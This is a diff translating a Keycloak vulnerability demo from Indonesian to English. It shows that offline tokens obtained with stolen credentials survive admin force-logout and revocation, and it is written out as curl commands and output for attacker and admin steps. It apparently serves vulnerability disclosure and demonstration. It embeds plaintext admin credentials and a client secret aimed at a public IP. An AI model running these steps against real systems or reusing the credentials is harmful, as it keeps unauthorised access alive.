@@ -1,20 +1,20 @@
 # Tutorial: Finding #3 — Offline Token Persistence After Admin Revocation
 
 **Severity:** HIGH (CVSS 7.5)
-**Waktu demo:** ~8 menit
-**Kebutuhan:** Terminal + Browser (Admin Console)
+**Demo time:** ~8 minutes
+**Requirements:** Terminal + Browser (Admin Console)
 
 ---
 
-## Skenario Serangan
+## Attack Scenario
 
-1. **Attacker** mencuri password user → dapat offline token
-2. **Security team** mendeteksi breach → admin force logout semua session
-3. **Attacker** masih bisa akses karena offline token tidak ter-revoke!
+1. **Attacker** steals user password → obtains offline token
+2. **Security team** detects breach → admin force logs out all sessions
+3. **Attacker** still has access because the offline token is not revoked!
 
 ---
 
-## Langkah 0: Pastikan Keycloak Berjalan
+## Step 0: Ensure Keycloak is Running
 
 ```bash
 curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
@@ -22,9 +22,9 @@ curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('
 
 ---
 
-## Langkah 1: (ATTACKER) Login dan Dapatkan Offline Token
+## Step 1: (ATTACKER) Login and Obtain Offline Token
 
-Attacker menggunakan kredensial yang sudah dicuri:
+Attacker uses stolen credentials:
 
 ```bash
 OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -38,13 +38,13 @@ OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/o
 echo "$OFFLINE_RESP" | python3 -m json.tool | head -10
 ```
 
-Simpan offline token:
+Save offline token:
 ```bash
 OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
 echo "Offline token: ${OFFLINE_TOKEN:0:60}..."
 ```
 
-Verifikasi tipe token = "Offline":
+Verify token type = "Offline":
 ```bash
 echo "$OFFLINE_RESP" | python3 -c "
 import sys,json,base64
@@ -58,7 +58,7 @@ Output: `Token type: Offline`
 
 ---
 
-## Langkah 2: (ATTACKER) Verifikasi Token Berfungsi
+## Step 2: (ATTACKER) Verify Token Works
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -70,41 +70,41 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/t
 ```
 Output: `Token valid: True`
 
-> Attacker berhasil mendapat access token baru menggunakan offline token.
+> Attacker successfully obtained a new access token using the offline token.
 
 ---
 
-## Langkah 3: (ADMIN) Deteksi Breach — Force Logout Semua Session
+## Step 3: (ADMIN) Detect Breach — Force Logout All Sessions
 
 ### 3a. Via Admin Console (Browser):
-1. Buka: `http://46.101.162.187:8080/admin/master/console/`
+1. Open: `http://46.101.162.187:8080/admin/master/console/`
 2. Login: `admin` / `Admin1234`
-3. Pilih realm **test**
-4. Klik **Users** → cari **testuser** → klik
-5. Tab **Sessions** → klik **Sign out all sessions** (atau **Logout all sessions**)
+3. Select realm **test**
+4. Click **Users** → search for **testuser** → click
+5. Tab **Sessions** → click **Sign out all sessions** (or **Logout all sessions**)
 
-### 3b. Atau via CLI:
+### 3b. Or via CLI:
 
 ```bash
-# Dapatkan admin token
+# Get admin token
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
   -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
 
-# Dapatkan user ID
+# Get user ID
 USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "http://localhost:8080/admin/realms/test/users?username=testuser" \
   | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")
 echo "User ID: $USER_ID"
 
-# Force logout semua session
+# Force logout all sessions
 curl -s -o /dev/null -w "Force logout: HTTP %{http_code}\n" -X POST \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   "http://localhost:8080/admin/realms/test/users/$USER_ID/logout"
 ```
-Output: `Force logout: HTTP 204` (sukses)
+Output: `Force logout: HTTP 204` (success)
 
-Verifikasi session aktif sudah hilang:
+Verify active sessions are gone:
 ```bash
 curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "http://localhost:8080/admin/realms/test/users/$USER_ID/sessions" \
@@ -112,11 +112,11 @@ curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
 ```
 Output: `Active sessions: 0`
 
-> Admin berhasil logout semua session. Seharusnya aman kan?
+> Admin successfully logged out all sessions. Should be safe now, right?
 
 ---
 
-## Langkah 4: (ATTACKER) Test Offline Token — MASIH BERFUNGSI!
+## Step 4: (ATTACKER) Test Offline Token — STILL WORKS!
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -124,22 +124,22 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/t
   -d "client_secret=mysecret123" \
   -d "grant_type=refresh_token" \
   -d "refresh_token=$OFFLINE_TOKEN" \
-  | python3 -c "import sys,json; d=json.load(sys.stdin); print('SETELAH FORCE LOGOUT:'); print('Token masih valid:', 'access_token' in d)"
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('AFTER FORCE LOGOUT:'); print('Token still valid:', 'access_token' in d)"
 ```
 
 **Output (VULNERABLE):**
 ```
-SETELAH FORCE LOGOUT:
-Token masih valid: True
+AFTER FORCE LOGOUT:
+Token still valid: True
 ```
 
-> **OFFLINE TOKEN MASIH BERFUNGSI** meskipun admin sudah force logout!
+> **OFFLINE TOKEN STILL WORKS** even though admin already force logged out!
 
 ---
 
-## Langkah 5: (ADMIN) Push Not-Before Revocation
+## Step 5: (ADMIN) Push Not-Before Revocation
 
-Admin coba cara lain — push revocation policy:
+Admin tries another approach — push revocation policy:
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -153,7 +153,7 @@ Output: `{}`
 
 ---
 
-## Langkah 6: (ATTACKER) Test Lagi — MASIH BERFUNGSI!
+## Step 6: (ATTACKER) Test Again — STILL WORKS!
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -161,18 +161,18 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/t
   -d "client_secret=mysecret123" \
   -d "grant_type=refresh_token" \
   -d "refresh_token=$OFFLINE_TOKEN" \
-  | python3 -c "import sys,json; d=json.load(sys.stdin); print('SETELAH PUSH REVOCATION:'); print('Token masih valid:', 'access_token' in d)"
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('AFTER PUSH REVOCATION:'); print('Token still valid:', 'access_token' in d)"
 ```
 
 **Output (VULNERABLE):**
 ```
-SETELAH PUSH REVOCATION:
-Token masih valid: True
+AFTER PUSH REVOCATION:
+Token still valid: True
 ```
 
 ---
 
-## Langkah 7: (ADMIN) Coba DELETE Offline Session — GAGAL 404!
+## Step 7: (ADMIN) Try DELETE Offline Session — FAILED 404!
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -193,23 +193,23 @@ curl -s -o /dev/null -w "DELETE offline sessions: HTTP %{http_code}\n" -X DELETE
 DELETE offline sessions: HTTP 404
 ```
 
-> Admin REST API tidak bisa delete offline sessions — endpoint return 404!
+> Admin REST API cannot delete offline sessions — endpoint returns 404!
 
 ---
 
-## Langkah 8: Tunjukkan Offline Session Masih Ada
+## Step 8: Show Offline Session Still Exists
 
 ```bash
 curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
   "http://localhost:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID" \
-  | python3 -c "import sys,json; sessions=json.load(sys.stdin); print(f'Offline sessions aktif: {len(sessions)}')"
+  | python3 -c "import sys,json; sessions=json.load(sys.stdin); print(f'Active offline sessions: {len(sessions)}')"
 ```
 
-Output: `Offline sessions aktif: X` (X > 0)
+Output: `Active offline sessions: X` (X > 0)
 
 ---
 
-## Langkah 9: Jalankan Python PoC (Otomatis Semua)
+## Step 9: Run Python PoC (Fully Automated)
 
 ```bash
 python3 pocs/poc_f3_offline_token.py --host http://localhost:8080
@@ -217,13 +217,13 @@ python3 pocs/poc_f3_offline_token.py --host http://localhost:8080
 
 ---
 
-## Ringkasan
+## Summary
 
-| Aksi Admin | Efek pada Offline Token | Status |
+| Admin Action | Effect on Offline Token | Status |
 |---|---|---|
-| Force logout (`POST /users/{id}/logout`) | **Tidak ada efek** — token masih valid | VULNERABLE |
-| Push revocation (`POST /push-revocation`) | **Tidak ada efek** — token masih valid | VULNERABLE |
-| DELETE offline session | **HTTP 404** — endpoint tidak berfungsi | VULNERABLE |
-| **Ganti password user** | Token ter-revoke | Satu-satunya mitigasi |
+| Force logout (`POST /users/{id}/logout`) | **No effect** — token still valid | VULNERABLE |
+| Push revocation (`POST /push-revocation`) | **No effect** — token still valid | VULNERABLE |
+| DELETE offline session | **HTTP 404** — endpoint does not work | VULNERABLE |
+| **Change user password** | Token revoked | Only mitigation |
 
-**Kesimpulan:** Offline token memberikan akses PERMANEN yang tidak bisa di-revoke oleh admin melalui cara apapun kecuali mengganti password user.
+**Conclusion:** Offline tokens grant PERMANENT access that cannot be revoked by the admin through any means except changing the user's password.
